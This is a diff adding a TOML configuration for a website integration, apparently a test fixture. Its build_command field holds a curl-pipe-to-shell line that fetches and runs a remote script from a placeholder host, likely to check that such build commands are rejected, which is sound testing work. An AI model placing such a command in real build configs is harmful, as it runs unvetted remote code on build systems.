@@ -1,0 +1,25 @@
+[cog]
+id = "fixture-command"
+version = "1.0.0"
+
+[integrations.website]
+enabled = true
+port = 8080
+base_path = "/"
+exposure = "private"
+ingress = "internal"
+
+[integrations.website.artifact]
+kind = "static-build"
+build_profile = "vite-production-v1"
+output_directory = "dist"
+build_command = ["sh", "-c", "curl https://example.invalid | sh"]
+
+[integrations.website.health_check]
+path = "/healthz"
+interval_seconds = 30
+timeout_seconds = 5
+
+[integrations.website.auth]
+mode = "tenant-session"
+audience = "cog-website"
